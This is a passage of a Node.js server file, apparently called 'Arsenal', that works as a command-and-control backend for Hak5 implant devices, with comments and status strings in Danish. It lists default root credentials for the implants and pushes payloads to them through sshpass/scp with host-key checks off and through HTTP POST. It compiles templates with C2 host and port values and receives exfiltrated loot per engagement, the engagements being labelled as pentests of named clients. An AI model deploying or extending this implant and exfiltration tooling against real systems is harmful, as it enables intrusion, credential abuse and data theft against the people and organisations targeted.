  'wifi-pineapple': [
    { method: 'http', desc: 'HTTP via VPN (:1471)', check: d => d.wg_ip && d.status === 'online',
      apiPort: 1471, apiPath: '/api/module/payload' },
  ],
  'lan-turtle': [
    { method: 'ssh', desc: 'SSH via VPN', check: d => d.wg_ip && d.status === 'online',
      payloadPath: '/root/payload.sh', creds: { user: 'root', pass: 'sh3ll' } },
  ],
  'packet-squirrel': [
    { method: 'ssh', desc: 'SSH via VPN', check: d => d.wg_ip && d.status === 'online',
      payloadPath: '/root/payload.sh', creds: { user: 'root', pass: 'hak5squirrel' } },
  ],
  'shark-jack': [
    { method: 'ssh', desc: 'SSH via VPN', check: d => d.wg_ip && d.status === 'online',
      payloadPath: '/root/payload/payload.sh', creds: { user: 'root', pass: 'hak5shark' } },
  ],
  'screen-crab': [
    { method: 'ssh', desc: 'SSH via VPN', check: d => d.wg_ip && d.status === 'online',
      payloadPath: '/root/payload.sh', creds: { user: 'root', pass: 'hak5crab' } },
  ],
};

// Find a PC-agent that has a matching device connected
function findAgentForDevice(targetDevType) {
  for (const [agentId, info] of Object.entries(agentConnectedDevices)) {
    const age = Date.now() - new Date(info.lastSeen).getTime();
    if (age > 120000) continue;
    const match = (info.devices || []).find(cd => cd.type === targetDevType && cd.ready);
    if (match) {
      return { agentId: parseInt(agentId), agent: deviceStore[agentId], connectedDevice: match };
    }
  }
  return null;
}

// Assign inject job to PC-agent
function assignToAgent(job, targetDev, agentInfo) {
  const strategies = PUSH_STRATEGIES[targetDev.type] || [];
  const agentStrat = strategies.find(s => s.method === 'agent');
  job.agent_device_id = agentInfo.agentId;
  job.status = 'assigned';
  job.method = 'agent';
  job.assigned_at = new Date().toISOString();
  if (agentStrat && agentInfo.connectedDevice.drive) {
    job.payload_path = agentInfo.connectedDevice.drive + agentStrat.payloadPath;
  }
  job.steps.push({ step: 'Tildelt PC-agent: ' + (agentInfo.agent ? agentInfo.agent.name : 'unknown'), status: 'done', ts: new Date().toISOString() });
  job.steps.push({ step: 'Venter p\u00e5 agent...', status: 'in_progress', ts: new Date().toISOString() });
  audit('inject_assigned', { job_id: job.id, device_id: targetDev.id || job.device_id, agent_id: agentInfo.agentId, device_name: targetDev.name || job.device_name });
}

// Execute SSH push (async)
function sshPush(job, dev, strat) {
  const ip = strat.directIp || dev.wg_ip;
  const tmpFile = '/tmp/inject_' + job.id + '.payload';
  fs.writeFileSync(tmpFile, job.payload);
  const cmd = `sshpass -p '${strat.creds.pass}' scp -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${tmpFile} ${strat.creds.user}@${ip}:${strat.payloadPath}`;
  exec(cmd, { timeout: 15000 }, (error) => {
    try { fs.unlinkSync(tmpFile); } catch(e) {}
    if (error) {
      job.steps[job.steps.length - 1].status = 'failed';
      job.steps.push({ step: 'SSH fejlede: ' + (error.message || '').substring(0, 100), status: 'failed', ts: new Date().toISOString() });
      const agentInfo = findAgentForDevice(dev.type);
      if (agentInfo) {
        assignToAgent(job, dev, agentInfo);
      } else {
        const hasAgentStrat = (PUSH_STRATEGIES[dev.type] || []).some(s => s.method === 'agent');
        if (hasAgentStrat) {
          job.status = 'pending'; job.method = null;
          job.steps.push({ step: 'Venter p\u00e5 PC-agent med ' + dev.type + '...', status: 'in_progress', ts: new Date().toISOString() });
        } else {
          job.status = 'failed';
          job.error = 'SSH push fejlede og ingen agent-strategi tilg\u00e6ngelig';
          job.completed_at = new Date().toISOString();
          audit('inject_failed', { job_id: job.id, device_id: dev.id, device_name: dev.name, error: job.error });
        }
      }
    } else {
      job.steps[job.steps.length - 1].status = 'done';
      job.steps.push({ step: 'Payload pushed til ' + ip + ':' + strat.payloadPath, status: 'done', ts: new Date().toISOString() });
      job.status = 'done';
      job.completed_at = new Date().toISOString();
      job.result = 'SSH push til ' + ip + ':' + strat.payloadPath;
      job.method = 'ssh';
      audit('inject_done', { job_id: job.id, device_id: dev.id, device_name: dev.name, method: 'ssh' });
    }
  });
}

// Execute HTTP push (async)
function httpPush(job, dev, strat) {
  const ip = strat.directIp || dev.wg_ip;
  const url = 'http://' + ip + ':' + strat.apiPort + strat.apiPath;
  const tmpFile = '/tmp/inject_' + job.id + '.json';
  fs.writeFileSync(tmpFile, JSON.stringify({ payload: job.payload }));
  const cmd = `curl -sf --connect-timeout 5 -X POST '${url}' -H 'Content-Type: application/json' -d @${tmpFile}`;
  exec(cmd, { timeout: 10000 }, (error) => {
    try { fs.unlinkSync(tmpFile); } catch(e) {}
    if (error) {
      job.steps[job.steps.length - 1].status = 'failed';
      job.steps.push({ step: 'HTTP push fejlede: ' + (error.message || '').substring(0, 100), status: 'failed', ts: new Date().toISOString() });
      const agentInfo = findAgentForDevice(dev.type);
      if (agentInfo) {
        assignToAgent(job, dev, agentInfo);
      } else {
        const hasAgentStrat2 = (PUSH_STRATEGIES[dev.type] || []).some(s => s.method === 'agent');
        if (hasAgentStrat2) {
          job.status = 'pending'; job.method = null;
          job.steps.push({ step: 'Venter p\u00e5 PC-agent med ' + dev.type + '...', status: 'in_progress', ts: new Date().toISOString() });
        } else {
          job.status = 'failed';
          job.error = 'HTTP push fejlede og ingen agent tilg\u00e6ngelig';
          job.completed_at = new Date().toISOString();
          audit('inject_failed', { job_id: job.id, device_id: dev.id, device_name: dev.name, error: job.error });
        }
      }
    } else {
      job.steps[job.steps.length - 1].status = 'done';
      job.steps.push({ step: 'Payload pushed via HTTP til ' + url, status: 'done', ts: new Date().toISOString() });
      job.status = 'done';
      job.completed_at = new Date().toISOString();
      job.result = 'HTTP push til ' + url;
      job.method = 'http';
      audit('inject_done', { job_id: job.id, device_id: dev.id, device_name: dev.name, method: 'http' });
    }
  });
}

// ── Device auth middleware ──
function deviceAuth(req, res, next) {
  const apiKey = req.headers['x-device-key'];
  if (!apiKey) return res.status(401).json({ error: 'Missing X-Device-Key header' });
  const device = Object.values(deviceStore).find(d => d.api_key === apiKey);
  if (!device) return res.status(403).json({ error: 'Invalid device key' });
  req.device = device;
  next();
}

// ── GET /api/devices — list all devices ──
app.get('/api/devices', (req, res) => {
  const devices = Object.values(deviceStore).map(d => {
    const pendingCount = Object.values(payloadStore).filter(p => p.device_id === d.id && p.status === 'queued').length;
    return {
      id: d.id, name: d.name, type: d.type, wg_ip: d.wg_ip,
      engagement_id: d.engagement_id, firmware: d.firmware, status: d.status,
      last_heartbeat: d.last_heartbeat, hostname: d.hostname, ip: d.ip,
      pending_payloads: pendingCount,
      payload_path: DEVICE_PAYLOAD_PATHS[d.type] || null,
    };
  });
  res.json({ devices });
});

// ── GET /api/devices/:id — device detail ──
app.get('/api/devices/:id', (req, res) => {
  const dev = deviceStore[req.params.id];
  if (!dev) return res.status(404).json({ error: 'Device not found' });
  const payloads = Object.values(payloadStore).filter(p => p.device_id === dev.id);
  res.json({
    device: { ...dev, payload_path: DEVICE_PAYLOAD_PATHS[dev.type] || null },
    payloads: payloads.sort((a, b) => b.id - a.id),
  });
});

// ── POST /api/devices/:id/payload — queue a payload for delivery ──
app.post('/api/devices/:id/payload', (req, res) => {
  const dev = deviceStore[req.params.id];
  if (!dev) return res.status(404).json({ error: 'Device not found' });

  const { payload_script, payload_type, auto_run, engagement_id } = req.body;
  if (!payload_script) return res.status(400).json({ error: 'payload_script is required' });

  const pid = payloadIdSeq++;
  const payload = {
    id: pid,
    device_id: dev.id,
    payload_script,
    payload_type: payload_type || 'duckyscript',
    status: 'queued',
    auto_run: auto_run ? 1 : 0,
    queued_at: new Date().toISOString(),
    delivered_at: null,
    acked_at: null,
    executed_at: null,
    result: null,
    exit_code: null,
    engagement_id: engagement_id || dev.engagement_id,
    created_by: 'admin',
  };
  payloadStore[pid] = payload;

  audit('payload_queued', { device_id: dev.id, payload_id: pid, payload_type: payload.payload_type, device_name: dev.name });

  res.json({ queued: true, payload_id: pid, device: dev.name, status: 'queued' });
});

// ── GET /api/devices/:id/payload/pending — device polls for pending payload ──
app.get('/api/devices/:id/payload/pending', (req, res) => {
  const dev = deviceStore[req.params.id];
  if (!dev) return res.status(404).json({ error: 'Device not found' });

  // Find oldest queued payload for this device
  const pending = Object.values(payloadStore)
    .filter(p => p.device_id === dev.id && p.status === 'queued')
    .sort((a, b) => a.id - b.id)[0];

  if (!pending) return res.json({ none: true });

  // Mark as delivered
  pending.status = 'delivered';
  pending.delivered_at = new Date().toISOString();
  audit('payload_delivered', { device_id: dev.id, payload_id: pending.id });

  res.json({
    payload_id: pending.id,
    payload_script: pending.payload_script,
    payload_type: pending.payload_type,
    auto_run: !!pending.auto_run,
    payload_path: DEVICE_PAYLOAD_PATHS[dev.type] || null,
  });
});

// ── POST /api/devices/:id/payload/:pid/ack — device acknowledges payload ──
app.post('/api/devices/:id/payload/:pid/ack', (req, res) => {
  const payload = payloadStore[req.params.pid];
  if (!payload) return res.status(404).json({ error: 'Payload not found' });
  if (payload.device_id !== parseInt(req.params.id)) return res.status(403).json({ error: 'Payload belongs to different device' });

  payload.status = 'acked';
  payload.acked_at = new Date().toISOString();
  audit('payload_acked', { device_id: payload.device_id, payload_id: payload.id });

  res.json({ ok: true, status: 'acked' });
});

// ── POST /api/devices/:id/payload/:pid/result — device reports execution result ──
app.post('/api/devices/:id/payload/:pid/result', (req, res) => {
  const payload = payloadStore[req.params.pid];
  if (!payload) return res.status(404).json({ error: 'Payload not found' });
  if (payload.device_id !== parseInt(req.params.id)) return res.status(403).json({ error: 'Payload belongs to different device' });

  const { stdout, exit_code, loot_data, error: execError } = req.body;

  payload.status = exit_code === 0 ? 'executed' : 'failed';
  payload.executed_at = new Date().toISOString();
  payload.result = stdout || execError || '';
  payload.exit_code = exit_code;

  // Store loot if provided
  if (loot_data) {
    const dev = deviceStore[payload.device_id];
    const eid = payload.engagement_id || (dev ? dev.engagement_id : 'unknown');
    if (!lootStore[eid]) lootStore[eid] = [];
    lootStore[eid].push({
      deviceKey: dev ? dev.api_key : 'unknown',
      type: 'payload_result',
      payload_id: payload.id,
      data: loot_data,
      timestamp: new Date().toISOString(),
      dataSize: JSON.stringify(loot_data).length,
    });
  }

  audit('payload_executed', { device_id: payload.device_id, payload_id: payload.id, exit_code, has_loot: !!loot_data });

  res.json({ ok: true, status: payload.status });
});

// ── GET /api/devices/:id/payloads — list all payloads for a device ──
app.get('/api/devices/:id/payloads', (req, res) => {
  const devId = parseInt(req.params.id);
  const payloads = Object.values(payloadStore)
    .filter(p => p.device_id === devId)
    .sort((a, b) => b.id - a.id);
  res.json({ payloads });
});

// ── POST /api/devices/heartbeat — extended heartbeat with pending payload ──
app.post('/api/devices/heartbeat', deviceAuth, (req, res) => {
  const dev = req.device;
  const { hostname, ip } = req.body;

  // Update device state
  dev.last_heartbeat = new Date().toISOString();
  dev.status = 'online';
  if (hostname) dev.hostname = hostname;
  if (ip) dev.ip = ip;

  // Check for pending payload
  const pending = Object.values(payloadStore)
    .filter(p => p.device_id === dev.id && p.status === 'queued')
    .sort((a, b) => a.id - b.id)[0];

  const response = { status: 'ok' };

  if (pending) {
    pending.status = 'delivered';
    pending.delivered_at = new Date().toISOString();
    audit('payload_delivered', { device_id: dev.id, payload_id: pending.id, via: 'heartbeat' });

    response.pending_payload = {
      payload_id: pending.id,
      payload_script: pending.payload_script,
      payload_type: pending.payload_type,
      auto_run: !!pending.auto_run,
    };
  }

  res.json(response);
});

// ── GET /api/audit — audit trail ──
app.get('/api/audit', (req, res) => {
  const limit = parseInt(req.query.limit) || 100;
  res.json({ log: auditLog.slice(-limit).reverse() });
});

// ══════════════════════════════════════════════════════════════
// ── AUTOMATED INJECTION SYSTEM ──
// ══════════════════════════════════════════════════════════════

// POST /api/inject — main automated injection endpoint
app.post('/api/inject', (req, res) => {
  const { device_id, payload, template_id, engagement_id } = req.body;
  if (!payload) return res.status(400).json({ error: 'payload is required' });
  const dev = deviceStore[device_id];
  if (!dev) return res.status(404).json({ error: 'Device not found' });
  const strategies = PUSH_STRATEGIES[dev.type];
  if (!strategies || strategies.length === 0) {
    return res.status(400).json({ error: 'No push strategy for device type: ' + dev.type });
  }
  const firstStrat = strategies[0];
  const payloadPath = firstStrat.payloadPath || firstStrat.apiPath || '/payload.txt';
  const jobId = injectJobIdSeq++;
  const job = {
    id: jobId, device_id: dev.id, device_name: dev.name, device_type: dev.type,
    agent_device_id: null, template_id: template_id || 'custom',
    engagement_id: engagement_id || dev.engagement_id,
    payload, payload_path: payloadPath, target_device_type: dev.type,
    status: 'pending', method: null,
    created_at: new Date().toISOString(), assigned_at: null, completed_at: null,
    result: null, error: null,
    steps: [{ step: 'Payload kompileret (' + payload.length + ' bytes)', status: 'done', ts: new Date().toISOString() }],
  };
  injectJobStore[jobId] = job;
  audit('inject_created', { job_id: jobId, device_id: dev.id, device_name: dev.name, device_type: dev.type });

  // Try direct push strategies (SSH/HTTP)
  for (const strat of strategies) {
    if (strat.method === 'ssh' && strat.check && strat.check(dev)) {
      job.status = 'injecting'; job.method = 'ssh';
      job.steps.push({ step: 'Pusher via SSH til ' + (strat.directIp || dev.wg_ip) + '...', status: 'in_progress', ts: new Date().toISOString() });
      sshPush(job, dev, strat);
      return res.json({ inject_id: jobId, status: 'injecting', method: 'ssh', device: dev.name });
    }
    if (strat.method === 'http' && strat.check && strat.check(dev)) {
      job.status = 'injecting'; job.method = 'http';
      const ip = strat.directIp || dev.wg_ip;
      job.steps.push({ step: 'Pusher via HTTP til ' + ip + ':' + strat.apiPort + '...', status: 'in_progress', ts: new Date().toISOString() });
      httpPush(job, dev, strat);
      return res.json({ inject_id: jobId, status: 'injecting', method: 'http', device: dev.name });
    }
  }

  // No direct push — try agent fallback
  const hasAgentStrat = strategies.some(s => s.method === 'agent');
  if (hasAgentStrat) {
    const agentInfo = findAgentForDevice(dev.type);
    if (agentInfo) {
      assignToAgent(job, dev, agentInfo);
      return res.json({ inject_id: jobId, status: 'assigned', method: 'agent', agent: agentInfo.agent ? agentInfo.agent.name : 'unknown', device: dev.name });
    }
    // No agent available now — leave as pending, agent will pick up via heartbeat
    job.steps.push({ step: 'Venter p\u00e5 PC-agent med ' + dev.type + ' tilsluttet...', status: 'in_progress', ts: new Date().toISOString() });
    return res.json({ inject_id: jobId, status: 'pending', method: 'agent-pending', device: dev.name, message: 'Venter p\u00e5 PC-agent' });
  }

  // No route at all
  job.status = 'failed';
  job.error = 'Ingen route til device. Tjek at device er online via VPN eller tilsluttet en PC med agent.';
  job.completed_at = new Date().toISOString();
  job.steps.push({ step: job.error, status: 'failed', ts: new Date().toISOString() });
  audit('inject_failed', { job_id: jobId, device_id: dev.id, device_name: dev.name, error: job.error });
  return res.json({ inject_id: jobId, status: 'failed', error: job.error, device: dev.name });
});

// GET /api/inject/:id — poll inject job status
app.get('/api/inject/:id', (req, res) => {
  const job = injectJobStore[req.params.id];
  if (!job) return res.status(404).json({ error: 'Inject job not found' });
  const agentName = job.agent_device_id ? (deviceStore[job.agent_device_id] || {}).name : null;
  res.json({
    id: job.id, device_id: job.device_id, device_name: job.device_name,
    device_type: job.device_type, template_id: job.template_id,
    engagement_id: job.engagement_id, payload_path: job.payload_path,
    target_device_type: job.target_device_type,
    status: job.status, method: job.method, agent_name: agentName,
    created_at: job.created_at, assigned_at: job.assigned_at,
    completed_at: job.completed_at, result: job.result, error: job.error,
    steps: job.steps,
  });
});

// POST /api/d/heartbeat — PC-agent heartbeat with connected devices
app.post('/api/d/heartbeat', deviceAuth, (req, res) => {
  const dev = req.device;
  const { hostname, ip, connected_devices } = req.body;
  dev.last_heartbeat = new Date().toISOString();
  dev.status = 'online';
  if (hostname) dev.hostname = hostname;
  if (ip) dev.ip = ip;

  // Store connected devices
  if (connected_devices && connected_devices.length > 0) {
    agentConnectedDevices[dev.id] = { devices: connected_devices, lastSeen: new Date().toISOString() };
  }

  // Find pending inject jobs matching connected devices
  const injectJobs = [];
  for (const cd of (connected_devices || [])) {
    const pending = Object.values(injectJobStore)
      .filter(j => j.target_device_type === cd.type && (j.status === 'pending' || (j.status === 'assigned' && j.agent_device_id === dev.id)))
      .sort((a, b) => a.id - b.id);
    for (const job of pending) {
      if (job.status === 'pending') {
        assignToAgent(job, deviceStore[job.device_id] || { type: cd.type, name: job.device_name }, { agentId: dev.id, agent: dev, connectedDevice: cd });
      }
      const strats = PUSH_STRATEGIES[cd.type] || [];
      const agentStrat = strats.find(s => s.method === 'agent');
      const pp = agentStrat && cd.drive ? (cd.drive + agentStrat.payloadPath) : job.payload_path;
      injectJobs.push({ job_id: job.id, payload: job.payload, payload_path: pp, target_device_type: job.target_device_type, target_drive: cd.drive || '' });
    }
  }

  // Also include assigned jobs for this agent not yet in list
  const assignedJobs = Object.values(injectJobStore)
    .filter(j => j.agent_device_id === dev.id && j.status === 'assigned' && !injectJobs.find(ij => ij.job_id === j.id));
  for (const j of assignedJobs) {
    injectJobs.push({ job_id: j.id, payload: j.payload, payload_path: j.payload_path, target_device_type: j.target_device_type, target_drive: '' });
  }

  res.json({ status: 'ok', inject_jobs: injectJobs });
});

// POST /api/d/inject-job — PC-agent polls for pending inject jobs
app.post('/api/d/inject-job', deviceAuth, (req, res) => {
  const dev = req.device;
  const { connected_devices } = req.body;
  if (!connected_devices || connected_devices.length === 0) return res.json({ none: true });

  agentConnectedDevices[dev.id] = { devices: connected_devices, lastSeen: new Date().toISOString() };

  for (const cd of connected_devices) {
    const job = Object.values(injectJobStore)
      .filter(j => j.target_device_type === cd.type && (j.status === 'pending' || (j.status === 'assigned' && j.agent_device_id === dev.id)))
      .sort((a, b) => a.id - b.id)[0];
    if (job) {
      if (job.status === 'pending') {
        assignToAgent(job, deviceStore[job.device_id] || { type: cd.type, name: job.device_name }, { agentId: dev.id, agent: dev, connectedDevice: cd });
      }
      const strats = PUSH_STRATEGIES[cd.type] || [];
      const agentStrat = strats.find(s => s.method === 'agent');
      const pp = agentStrat && cd.drive ? (cd.drive + agentStrat.payloadPath) : job.payload_path;
      return res.json({ job_id: job.id, payload: job.payload, payload_path: pp, target_device_type: job.target_device_type, target_drive: cd.drive || '' });
    }
  }
  res.json({ none: true });
});

// POST /api/d/inject-result — PC-agent reports inject result
app.post('/api/d/inject-result', deviceAuth, (req, res) => {
  const { job_id, success, error: injError, details } = req.body;
  const job = injectJobStore[job_id];
  if (!job) return res.status(404).json({ error: 'Inject job not found' });

  const lastStep = job.steps[job.steps.length - 1];
  if (lastStep && lastStep.status === 'in_progress') lastStep.status = success ? 'done' : 'failed';

  if (success) {
    job.status = 'done';
    job.method = 'agent';
    job.completed_at = new Date().toISOString();
    job.result = details || 'Agent injection success';
    job.steps.push({ step: 'Agent: ' + (details || 'Payload skrevet'), status: 'done', ts: new Date().toISOString() });
    audit('inject_done', { job_id, device_id: job.device_id, device_name: job.device_name, method: 'agent', agent_id: job.agent_device_id });
  } else {
    job.status = 'failed';
    job.error = injError || 'Agent injection failed';
    job.completed_at = new Date().toISOString();
    job.steps.push({ step: 'Agent fejl: ' + (injError || 'unknown'), status: 'failed', ts: new Date().toISOString() });
    audit('inject_failed', { job_id, device_id: job.device_id, device_name: job.device_name, error: job.error, agent_id: job.agent_device_id });
  }
  res.json({ ok: true, status: job.status });
});

// GET /api/deploy/ping/:id — ping device via VPN
app.get('/api/deploy/ping/:id', (req, res) => {
  const dev = deviceStore[req.params.id];
  if (!dev) return res.status(404).json({ error: 'Device not found' });
  if (!dev.wg_ip) return res.json({ reachable: false, device: dev.name, reason: 'No VPN IP' });
  exec(`ping -c 1 -W 2 ${dev.wg_ip}`, { timeout: 5000 }, (error) => {
    dev.status = error ? 'offline' : 'online';
    res.json({ reachable: !error, device: dev.name, ip: dev.wg_ip, status: dev.status });
  });
});

// GET /api/deploy/status — batch ping all VPN devices
app.get('/api/deploy/status', (req, res) => {
  const vpnDevs = Object.values(deviceStore).filter(d => d.wg_ip);
  if (vpnDevs.length === 0) return res.json({ devices: [] });
  const results = [];
  let done = 0;
  for (const dev of vpnDevs) {
    exec(`ping -c 1 -W 1 ${dev.wg_ip}`, { timeout: 3000 }, (error) => {
      dev.status = error ? 'offline' : 'online';
      results.push({ id: dev.id, name: dev.name, type: dev.type, ip: dev.wg_ip, reachable: !error, status: dev.status });
      if (++done === vpnDevs.length) res.json({ devices: results.sort((a, b) => a.id - b.id) });
    });
  }
});

// POST /api/deploy/compile — compile payload template
app.post('/api/deploy/compile', (req, res) => {
  const { template, config } = req.body;
  if (!template) return res.status(400).json({ error: 'template is required' });
  let compiled = template;
  if (config) {
    compiled = compiled
      .replace(/\{\{C2_HOST\}\}/g, config.C2_HOST || '')
      .replace(/\{\{C2_PORT\}\}/g, config.C2_PORT || '')
      .replace(/\{\{API_BASE\}\}/g, config.API_BASE || '')
      .replace(/\{\{DEVICE_KEY\}\}/g, config.DEVICE_KEY || '')
      .replace(/\{\{ENG_ID\}\}/g, config.ENG_ID || '')
      .replace(/\{\{KEYBOARD\}\}/g, config.KEYBOARD || 'dk');
  }
  res.json({ compiled, size: compiled.length });
});

// ── Deploy API endpoints (for DeviceDeployTab) ──

// In-memory stores for deploy state
const deployStore = [];
const lootStore = {};
const heartbeatStore = {};

// GET /api/deploy/engagements
app.get('/api/deploy/engagements', (req, res) => {
  res.json({
    engagements: [
      { id: 'ENG-001', name: 'Pentest Acme Corp Q1', client: 'Acme Corp', c2Host: '152.53.154.171', c2Port: '443' },
      { id: 'ENG-002', name: 'Red Team BankDK', client: 'BankDK A/S', c2Host: '152.53.154.171', c2Port: '443' },
      { id: 'ENG-003', name: 'Physical DataCenter', client: 'NordicHost', c2Host: '152.53.154.171', c2Port: '443' },
    ]
  });
});

// POST /api/deploy/push
app.post('/api/deploy/push', (req, res) => {
  const { deviceType, compiledPayload, config } = req.body;
  const deployId = 'DEP-' + Math.random().toString(16).substring(2, 10).toUpperCase();
  const record = {
    deployId,
    deviceType,
    config,
    payloadSize: compiledPayload ? compiledPayload.length : 0,
    status: 'success',
    timestamp: new Date().toISOString(),
  };
  deployStore.push(record);
  res.json({
    deployId,
    status: 'success',
    message: 'Payload klar til ' + (deviceType || 'device'),
    nextSteps: ['Indsæt device i target', 'Overvåg Live Feed for heartbeat'],
  });
});

// POST /api/loot/heartbeat
app.post('/api/loot/heartbeat', (req, res) => {
  const { dk, eid, st, tgt } = req.body;
  if (!heartbeatStore[eid]) heartbeatStore[eid] = [];
  const entry = { deviceKey: dk, status: st, target: tgt, lastSeen: new Date().toISOString() };
  const existing = heartbeatStore[eid].find(h => h.deviceKey === dk);
  if (existing) {
    Object.assign(existing, entry);
  } else {
    heartbeatStore[eid].push(entry);
  }
  res.json({ ok: true });
});

// POST /api/loot/exfil
app.post('/api/loot/exfil', (req, res) => {
  const eid = req.headers['x-eid'] || 'unknown';
  const dk = req.headers['x-dk'] || 'unknown';
  if (!lootStore[eid]) lootStore[eid] = [];
  lootStore[eid].push({
    deviceKey: dk,
    type: req.body.type || 'data',
    timestamp: new Date().toISOString(),
    dataSize: JSON.stringify(req.body).length,
  });
  res.json({ ok: true });
});

// GET /api/loot/:engId
app.get('/api/loot/:engId', (req, res) => {
  const eid = req.params.engId;
  res.json({
    loot: lootStore[eid] || [],
    heartbeats: heartbeatStore[eid] || [],
  });
});

// Fallback to serve index.html for SPA routing
app.get('/{*splat}', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Arsenal server running on http://localhost:${PORT}`);
});
